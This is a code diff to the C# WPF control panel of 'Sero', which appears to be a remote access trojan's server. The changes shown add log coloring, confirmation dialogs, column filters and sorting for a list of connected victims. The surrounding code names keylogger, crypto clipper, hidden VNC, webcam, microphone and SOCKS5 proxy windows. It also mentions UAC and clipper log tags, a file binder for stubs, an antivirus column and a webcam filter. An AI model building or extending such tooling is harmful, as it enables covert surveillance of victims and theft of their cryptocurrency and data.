+                UiPrefs.Set("SndEnabled_" + key, chk.IsChecked == true ? 1 : 0);
+            }
+        }
+    }
+
+    private void PreviewSound_Click(object sender, RoutedEventArgs e)
+    {
+        if (sender is System.Windows.Controls.Button btn && btn.Tag is string fileName)
+        {
+            NotificationService.PlayPreviewFile(fileName);
+        }
+    }
+
     private void SettingsNotifySound_Changed(object sender, RoutedEventArgs e)
     {
         NotificationService.SetEnabled(SettingsNotifySound.IsChecked == true);
         SaveConfig();
     }
 
-    private void SettingsLogsBadge_Changed(object sender, RoutedEventArgs e)
+    private void ClearLogs_Click(object sender, RoutedEventArgs e)
     {
-        // Hide badge immediately when disabled
-        if (SettingsLogsBadge.IsChecked != true)
-        {
-            _logUnseenCount = 0;
-            LogBadge.Visibility = Visibility.Collapsed;
-        }
-        SaveConfig();
+        if (TxtLogs == null) return;
+        TxtLogs.Document.Blocks.Clear();
+        _logPara = null;
+        _logLineCount = 0;
+        Log("[*] Logs cleared.");
     }
 
     private void SettingsDevLogs_Changed(object sender, RoutedEventArgs e)
@@ -3644,11 +3911,22 @@ Read-Host 'Press Enter to close'
     private void AutoTask_Remove_Click(object sender, RoutedEventArgs e)
     {
         var selected = GridAutoTasks.SelectedItems.Cast<Data.AutoTaskEntry>().ToList();
+        if (selected.Count == 0) return;
+        string msg = selected.Count == 1
+            ? $"Remove auto-task '{selected[0].FileName}'?\nThis cannot be undone."
+            : $"Remove {selected.Count} auto-tasks?\nThis cannot be undone.";
+        if (MessageBox.Show(msg, "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
         foreach (var task in selected)
         {
             _autoTasks.Remove(task);
             Log($"[-] AutoTask: removed {task.FileName}");
         }
+    }
+
+    private void AutoTask_Refresh_Click(object sender, RoutedEventArgs e)
+    {
+        LoadConfig();
+        SetStatus("AutoTasks reloaded from config.");
     }
 
     private async Task ExecuteAutoTasksForAllConnected()
@@ -3866,7 +4144,7 @@ Read-Host 'Press Enter to close'
 
             CertificateHelper.ExportServerBackup(dialog.FileName, authKey);
             Log($"[+] Server backup exported to {dialog.FileName}");
-            TxtStatusBar.Text = "Server backup exported.";
+            SetStatus("Server backup exported.");
             MessageBox.Show(
                 $"Backup exporté :\n{dialog.FileName}\n\nContient le certificat TLS et la clé d'auth.\nImportez ce fichier sur une autre machine pour que les clients reconnectent.",
                 "Sero — Backup réussi", MessageBoxButton.OK, MessageBoxImage.Information);
@@ -3907,7 +4185,7 @@ Read-Host 'Press Enter to close'
                     SaveConfig();
                 }
                 Log("[+] Server backup restored (cert + auth key).");
-                TxtStatusBar.Text = "Backup restored.";
+                SetStatus("Backup restored.");
                 MessageBox.Show(
                     "Backup restauré.\nCertificat + clé d'auth restaurés.\nRedémarrez le serveur pour que les clients reconnectent.",
                     "Sero — Import réussi", MessageBoxButton.OK, MessageBoxImage.Information);
@@ -3923,7 +4201,7 @@ Read-Host 'Press Enter to close'
                 }
                 try { BldCertHash.Text = CertificateHelper.GetCertSha256Hash(); } catch { }
                 Log("[+] Certificate imported.");
-                TxtStatusBar.Text = "Certificate imported.";
+                SetStatus("Certificate imported.");
                 MessageBox.Show(
                     "Certificat importé.\nATTENTION : la clé d'auth n'est pas incluse dans un .pfx.\nVérifiez que la clé d'auth dans le Builder correspond à celle de vos stubs.",
                     "Sero — Import cert", MessageBoxButton.OK, MessageBoxImage.Warning);
@@ -3953,7 +4231,7 @@ Read-Host 'Press Enter to close'
 
             CertificateHelper.ExportPfx(dialog.FileName);
             Log($"[+] Certificate exported to {dialog.FileName}");
-            TxtStatusBar.Text = "Certificate exported.";
+            SetStatus("Certificate exported.");
             MessageBox.Show(
                 $"Certificat exporté :\n{dialog.FileName}\n\nATTENTION : Ce fichier ne contient pas la clé d'auth.\nUtilisez 'Backup' pour exporter cert + clé d'auth ensemble.",
                 "Sero — Export cert", MessageBoxButton.OK, MessageBoxImage.Warning);
@@ -3996,7 +4274,6 @@ Read-Host 'Press Enter to close'
     private void Log(string msg)
     {
         if (TxtLogs == null) return; // called before XAML init completes
-        var entry = $"[{DateTime.Now:HH:mm:ss}] {msg}";
         _logLineCount++;
 
         // Mirror to diagnostic file (never blocks UI — fire and forget)
@@ -4014,26 +4291,151 @@ Read-Host 'Press Enter to close'
             p.Inlines.Add(trimNote);
         }
 
-        var run = new System.Windows.Documents.Run(entry + "\n")
+        var para = EnsureLogParagraph();
+        foreach (var (text, brush) in TokenizeLogEntry(msg))
         {
-            Foreground = GetLogBrush(msg)
-        };
-        EnsureLogParagraph().Inlines.Add(run);
-        TxtLogs.ScrollToEnd();
+            var run = new System.Windows.Documents.Run(text) { Foreground = brush };
+            para.Inlines.Add(run);
+        }
+    }
 
-        // Badge: increment if the Logs tab isn't active and the user hasn't disabled it
-        if (LogsTabItem != null && !LogsTabItem.IsSelected && SettingsLogsBadge.IsChecked == true)
+    private bool _autoScrollLogs = true;
+    private void TxtLogs_ScrollChanged(object sender, ScrollChangedEventArgs e)
+    {
+        // If the user scrolled up manually, turn off auto-scroll.
+        if (e.ExtentHeightChange == 0 && e.ViewportHeightChange == 0 && e.VerticalChange != 0)
         {
-            _logUnseenCount++;
-            LogBadgeTxt.Text = _logUnseenCount > 999 ? "999+" : $"+{_logUnseenCount}";
-            LogBadge.Visibility = Visibility.Visible;
+            _autoScrollLogs = (TxtLogs.VerticalOffset + TxtLogs.ViewportHeight >= TxtLogs.ExtentHeight - 10);
+        }
+
+        // If content size increased, or viewport changed (e.g. tab became visible),
+        // and auto-scroll is enabled, force scroll to end.
+        if (_autoScrollLogs && (e.ExtentHeightChange > 0 || e.ViewportHeightChange > 0))
+        {
+            TxtLogs.ScrollToEnd();
+        }
+    }
+
+    private static readonly System.Text.RegularExpressions.Regex _logTokenRegex = new(
+        @"(?<ip>\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)|(?<event>\b(?:connected|disconnected|failed|success|error)\b)|(?<client>\b(?:Client|client)\s+[A-Za-z0-9_-]+)|(?<user>\b[A-Za-z0-9_.-]+(?=@))",
+        System.Text.RegularExpressions.RegexOptions.Compiled | System.Text.RegularExpressions.RegexOptions.IgnoreCase);
+    private static readonly Brush _brushLogEvent = MakeBrush(0x60, 0xA5, 0xFA); // Blue
+    private static readonly Brush _brushLogClient = MakeBrush(0xA7, 0x8B, 0xFA); // Purple
+    private static readonly Brush _brushLogUser = MakeBrush(0x34, 0xD3, 0x99); // Emerald
+
+    private IEnumerable<(string text, Brush brush)> TokenizeLogEntry(string msg)
+    {
+        // Timestamp part
+        var now = DateTime.Now;
+        string timeFmt = (UiPrefs.GetInt("ShowSeconds", 0) == 1) ? "h:mm:ss tt" : "h:mm tt";
+        yield return ($"[{now.ToString(timeFmt)}] ", _brushLogTime);
+
+        // Determine base brush for the message body
+        var bodyBrush = GetLogBrush(msg);
+
+        // Check for tags that should get their own color
+        string body = msg;
+        if (body.StartsWith("[!]"))
+        {
+            yield return ("[!]", _brushLogError);
+            body = body[3..];
+        }
+        else if (body.StartsWith("[+]"))
+        {
+            yield return ("[+]", _brushLogSuccess);
+            body = body[3..];
+        }
+        else if (body.StartsWith("[*]"))
+        {
+            yield return ("[*]", _brushLogSuccess);
+            body = body[3..];
+        }
+        else if (body.StartsWith("[ADMIN]"))
+        {
+            yield return ("[ADMIN]", _brushLogAdmin);
+            body = body[7..];
+        }
+        else if (body.StartsWith("[CLIPPER]"))
+        {
+            yield return ("[CLIPPER]", _brushLogTask);
+            body = body[9..];
+        }
+        else if (body.StartsWith("[UAC]"))
+        {
+            yield return ("[UAC]", _brushLogTask);
+            body = body[5..];
+        }
+        else if (body.StartsWith("[WATCHDOG]"))
+        {
+            yield return ("[WATCHDOG]", _brushLogError);
+            body = body[10..];
+        }
+        else if (body.StartsWith("[RATE]"))
+        {
+            yield return ("[RATE]", _brushLogError);
+            body = body[6..];
+        }
+        else if (body.StartsWith("[AUTH]"))
+        {
+            yield return ("[AUTH]", _brushLogError);
+            body = body[6..];
+        }
+        else if (body.StartsWith("[LIMIT]"))
+        {
+            yield return ("[LIMIT]", _brushLogError);
+            body = body[7..];
+        }
+        else if (body.StartsWith("[AT:"))
+        {
+            int end = body.IndexOf(']');
+            if (end > 0)
+            {
+                yield return (body[..(end + 1)], _brushLogTask);
+                body = body[(end + 1)..];
+            }
+        }
+        else if (body.StartsWith("[-]"))
+        {
+            yield return ("[-]", _brushLogDisconnect);
+            body = body[3..];
+        }
+
+        // Extract tokens (IP, Event, Client ID, Username) from the remaining body and color them
+        int lastIdx = 0;
+        foreach (System.Text.RegularExpressions.Match match in _logTokenRegex.Matches(body))
+        {
+            if (match.Index > lastIdx)
+                yield return (body[lastIdx..match.Index], bodyBrush);
+
+            Brush tokenBrush = bodyBrush;
+            if (match.Groups["ip"].Success) tokenBrush = _brushLogIP;
+            else if (match.Groups["event"].Success) tokenBrush = _brushLogEvent;
+            else if (match.Groups["client"].Success) tokenBrush = _brushLogClient;
+            else if (match.Groups["user"].Success) tokenBrush = _brushLogUser;
+
+            yield return (match.Value, tokenBrush);
+            lastIdx = match.Index + match.Length;
+        }
+        if (lastIdx < body.Length)
+            yield return (body[lastIdx..], bodyBrush);
+
+        yield return ("\n", _brushLogDefault);
+    }
+
+    private void LogAdminAction(string friendlyName, int clientCount, string firstClientId)
+    {
+        if (clientCount == 1)
+        {
+            Log($"[ADMIN] {friendlyName} opened for client {firstClientId}.");
+        }
+        else
+        {
+            Log($"[ADMIN] {friendlyName} opened for {clientCount} clients.");
         }
     }
 
     private void LogsTab_Selected()
     {
-        _logUnseenCount = 0;
-        LogBadge.Visibility = Visibility.Collapsed;
     }
 
     private System.Windows.Documents.Paragraph EnsureLogParagraph()
@@ -4048,13 +4450,51 @@ Read-Host 'Press Enter to close'
 
     private static Brush GetLogBrush(string msg)
     {
+        // 1. Error / Warning / Alarm
         if (msg.Contains("[!]") ||
-            msg.Contains("[WATCHDOG]") || msg.Contains("[RATE]") ||
-            msg.Contains("[AUTH]")     || msg.Contains("[LIMIT]") ||
-            msg.Contains("[UAC]"))      return _brushLogError;
-        if (msg.Contains("dll", StringComparison.OrdinalIgnoreCase) ||
-            msg.Contains("[DLL]"))      return _brushLogDll;
-        if (msg.Contains("[+]") || msg.Contains("[*]")) return _brushLogGood;
+            msg.Contains("[WATCHDOG]") || 
+            msg.Contains("[RATE]") ||
+            msg.Contains("[AUTH]") || 
+            msg.Contains("[LIMIT]") ||
+            msg.Contains("FAILED"))
+        {
+            return _brushLogError;
+        }
+
+        // 2. Admin Action
+        if (msg.Contains("[ADMIN]"))
+        {
+            return _brushLogAdmin;
+        }
+
+        // 3. Client Connected
+        if (msg.Contains("connected (") || msg.Contains("connected successfully"))
+        {
+            return _brushLogConnect;
+        }
+
+        // 4. Client Disconnected
+        if (msg.Contains("disconnected.") || msg.Contains("disconnecting zombie"))
+        {
+            return _brushLogDisconnect;
+        }
+
+        // 5. Task Event / Operation / DLL
+        if (msg.Contains("[CLIPPER]") ||
+            msg.Contains("[AT:") ||
+            msg.Contains("[UAC]") ||
+            msg.Contains("dll", StringComparison.OrdinalIgnoreCase) ||
+            msg.Contains("[DLL]"))
+        {
+            return _brushLogTask;
+        }
+
+        // 6. Success / General Info
+        if (msg.Contains("[+]") || msg.Contains("[*]"))
+        {
+            return _brushLogSuccess;
+        }
+
         return _brushLogDefault;
     }
 
@@ -4469,7 +4909,17 @@ Read-Host 'Press Enter to close'
     private void BtnBinderRemove_Click(object sender, RoutedEventArgs e)
     {
         if (BinderGrid.SelectedItem is SeroServer.Binder.BinderEntry entry)
+        {
+            if (MessageBox.Show($"Remove '{entry.FileName}' from the binder?", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
             _binderEntries.Remove(entry);
+        }
+    }
+
+    private void BtnBinderClearAll_Click(object sender, RoutedEventArgs e)
+    {
+        if (_binderEntries.Count == 0) return;
+        if (MessageBox.Show($"Clear all {_binderEntries.Count} entries from the binder?", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+        _binderEntries.Clear();
     }
 
     private void BtnBinderUp_Click(object sender, RoutedEventArgs e)
@@ -4687,4 +5137,239 @@ Read-Host 'Press Enter to close'
             new DoubleAnimation(0, 1, TimeSpan.FromMilliseconds(220)) { EasingFunction = ease });
     }
 
+    // --- Grid Visibility, Filters, and Tag Customizations ---
+    private bool _webcamFilterOnly = false;
+    private bool _adminFilterOnly = false;
+
+    private void LoadColumnVisibility()
+    {
+        foreach (var col in GridClients.Columns)
+        {
+            string header = col.Header?.ToString() ?? "";
+            if (string.IsNullOrEmpty(header)) continue;
+
+            int isVisible = UiPrefs.GetInt($"ColVis_{header}", 1);
+            col.Visibility = isVisible == 1 ? Visibility.Visible : Visibility.Collapsed;
+        }
+    }
+
+    private void PopulateColumnVisibilityMenu()
+    {
+        if (StackColumnCheckboxes == null) return;
+        StackColumnCheckboxes.Children.Clear();
+        foreach (var col in GridClients.Columns)
+        {
+            string header = col.Header?.ToString() ?? "";
+            if (string.IsNullOrEmpty(header)) continue;
+
+            var cb = new System.Windows.Controls.CheckBox
+            {
+                Content = GetFriendlyColumnHeader(header),
+                Style = (Style)FindResource("SettingsChk"),
+                IsChecked = col.Visibility == Visibility.Visible,
+                Tag = col,
+                Margin = new Thickness(0, 0, 0, 8)
+            };
+            
+            string h = header;
+            cb.Checked += (s, ev) =>
+            {
+                col.Visibility = Visibility.Visible;
+                UiPrefs.Set($"ColVis_{h}", 1);
+            };
+            cb.Unchecked += (s, ev) =>
+            {
+                col.Visibility = Visibility.Collapsed;
+                UiPrefs.Set($"ColVis_{h}", 0);
+            };
+            
+            StackColumnCheckboxes.Children.Add(cb);
+        }
+    }
+
+    private string GetFriendlyColumnHeader(string header)
+    {
+        return header switch
+        {
+            "USER" => "User",
+            "PRIV" => "Privileges",
+            "COUNTRY" => "Country",
+            "MACHINE" => "Machine",
+            "AV" => "Antivirus",
+            "CAM" => "Webcam Icon",
+            "WINDOW" => "Active Window",
+            _ => header
+        };
+    }
+
+    private void UpdateSettingsCheckboxStates()
+    {
+        if (StackColumnCheckboxes == null) return;
+        foreach (var child in StackColumnCheckboxes.Children)
+        {
+            if (child is System.Windows.Controls.CheckBox cb && cb.Tag is System.Windows.Controls.DataGridColumn col)
+            {
+                cb.IsChecked = col.Visibility == Visibility.Visible;
+            }
+        }
+        
+        if (ChkFilterWebcam != null) ChkFilterWebcam.IsChecked = _webcamFilterOnly;
+        if (ChkFilterAdmin != null) ChkFilterAdmin.IsChecked = _adminFilterOnly;
+    }
+
+    private void BtnGridSettings_Click(object sender, RoutedEventArgs e)
+    {
+        if (GridSettingsPanel == null) return;
+        if (GridSettingsPanel.Visibility == Visibility.Visible)
+        {
+            GridSettingsPanel.Visibility = Visibility.Collapsed;
+        }
+        else
+        {
+            UpdateSettingsCheckboxStates();
+            GridSettingsPanel.Visibility = Visibility.Visible;
+        }
+    }
+
+    private void CloseGridSettings_Click(object sender, RoutedEventArgs e)
+    {
+        if (GridSettingsPanel != null)
+            GridSettingsPanel.Visibility = Visibility.Collapsed;
+    }
+
+    private void ChkFilterWebcam_Checked(object sender, RoutedEventArgs e)
+    {
+        _webcamFilterOnly = true;
+        RefreshClientFilters();
+    }
+
+    private void ChkFilterWebcam_Unchecked(object sender, RoutedEventArgs e)
+    {
+        _webcamFilterOnly = false;
+        RefreshClientFilters();
+    }
+
+    private void ChkFilterAdmin_Checked(object sender, RoutedEventArgs e)
+    {
+        _adminFilterOnly = true;
+        RefreshClientFilters();
+    }
+
+    private void ChkFilterAdmin_Unchecked(object sender, RoutedEventArgs e)
+    {
+        _adminFilterOnly = false;
+        RefreshClientFilters();
+    }
+
+    private void ResetGridSettings_Click(object sender, RoutedEventArgs e)
+    {
+        _webcamFilterOnly = false;
+        _adminFilterOnly = false;
+        if (TxtSearch != null) TxtSearch.Text = "";
+        
+        foreach (var col in GridClients.Columns)
+        {
+            string headerName = col.Header?.ToString() ?? "";
+            if (!string.IsNullOrEmpty(headerName))
+            {
+                col.Visibility = Visibility.Visible;
+                UiPrefs.Set($"ColVis_{headerName}", 1);
+            }
+        }
+        
+        UpdateSettingsCheckboxStates();
+        RefreshClientFilters();
+    }
+
+    private void RefreshClientFilters()
+    {
+        var view = System.Windows.Data.CollectionViewSource.GetDefaultView(GridClients.ItemsSource);
+        view?.Refresh();
+    }
+
+    private void GridClients_Sorting(object sender, DataGridSortingEventArgs e)
+    {
+        e.Handled = true;
+        var column = e.Column;
+        var view = System.Windows.Data.CollectionViewSource.GetDefaultView(GridClients.ItemsSource);
+        if (view == null) return;
+
+        var direction = (column.SortDirection != System.ComponentModel.ListSortDirection.Ascending)
+            ? System.ComponentModel.ListSortDirection.Ascending
+            : System.ComponentModel.ListSortDirection.Descending;
+        column.SortDirection = direction;
+
+        view.SortDescriptions.Clear();
+        // Always sort HasTag Descending first!
+        view.SortDescriptions.Add(new System.ComponentModel.SortDescription(nameof(ConnectedClient.HasTag), System.ComponentModel.ListSortDirection.Descending));
+
+        string sortPath = column.SortMemberPath;
+        if (string.IsNullOrEmpty(sortPath) && column is DataGridBoundColumn boundCol && boundCol.Binding is System.Windows.Data.Binding binding)
+        {
+            sortPath = binding.Path.Path;
+        }
+
+        if (!string.IsNullOrEmpty(sortPath))
+        {
+            view.SortDescriptions.Add(new System.ComponentModel.SortDescription(sortPath, direction));
+        }
+    }
+
+    private void UpdateOpenWindowTitlesAndLabels(string clientId, string tag)
+    {
+        var prefix = $"{clientId}:";
+        foreach (var kvp in _featureWindows.ToList())
+        {
+            if (kvp.Key.StartsWith(prefix))
+            {
+                var win = kvp.Value;
+                Dispatcher.BeginInvoke(() =>
+                {
+                    try
+                    {
+                        string friendly = GetFriendlyWindowName(win);
+                        win.Title = string.IsNullOrEmpty(tag)
+                            ? $"{friendly} — {clientId}"
+                            : $"{friendly} — {tag} ({clientId})";
+
+                        if (win.FindName("TxtTitle") is TextBlock tbTitle)
+                        {
+                            tbTitle.Text = string.IsNullOrEmpty(tag) ? clientId : $"{tag} ({clientId})";
+                        }
+                        else if (win.FindName("TxtClientId") is TextBlock tbClient)
+                        {
+                            tbClient.Text = string.IsNullOrEmpty(tag) ? $"[ {clientId} ]" : $"[ {tag} ({clientId}) ]";
+                        }
+                    }
+                    catch { }
+                });
+            }
+        }
+    }
+
+    private string GetFriendlyWindowName(Window win)
+    {
+        return win.GetType().Name switch
+        {
+            "RemoteDesktopWindow" => "Remote Desktop",
+            "WebcamWindow" => "Remote Webcam",
+            "HvncWindow" => "HVNC",
+            "FileManagerWindow" => "File Manager",
+            "ProcessManagerWindow" => "Process Manager",
+            "TcpManagerWindow" => "TCP Connections",
+            "StartupManagerWindow" => "Startup Manager",
+            "MicrophoneWindow" => "Microphone",
+            "FunWindow" => "Fun Panel",
+            "Socks5Window" => "SOCKS5 Proxy",
+            "ServiceManagerWindow" => "Service Manager",
+            "WindowManagerWindow" => "Window Manager",
+            "RegistryEditorWindow" => "Registry Editor",
+            "InstalledAppsWindow" => "Installed Programs",
+            "DeviceManagerWindow" => "Device Manager",
+            "PerformanceMonitorWindow" => "Performance Monitor",
+            "KeyloggerWindow" => "Keylogger",
+            "CryptoClipperWindow" => "Crypto Clipper",
+            _ => win.Title
+        };
+    }
 }
